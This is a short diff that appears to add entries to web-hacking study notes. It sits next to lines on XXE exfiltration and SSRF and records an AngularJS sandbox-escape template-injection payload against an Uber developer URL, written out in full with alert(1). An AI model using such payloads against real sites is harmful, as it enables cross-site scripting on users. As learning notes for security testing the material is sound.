@@ -90,6 +90,12 @@ try to use an alternative data exfiltration method.
 7. See if you can launch an SSRF attack using the XXE.
 
 
+Using the following JavaScript within the Uber URL, Kettle escaped
+the AngularJS Sandbox and executed the alert function:
+https://developer.uber.com/docs/deep-linking?q=wrtz{{(_="".sub).call.call({}
+[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")
+()}}zzzz
+MORAL: Search for sandbox escape payloads
 
 
 
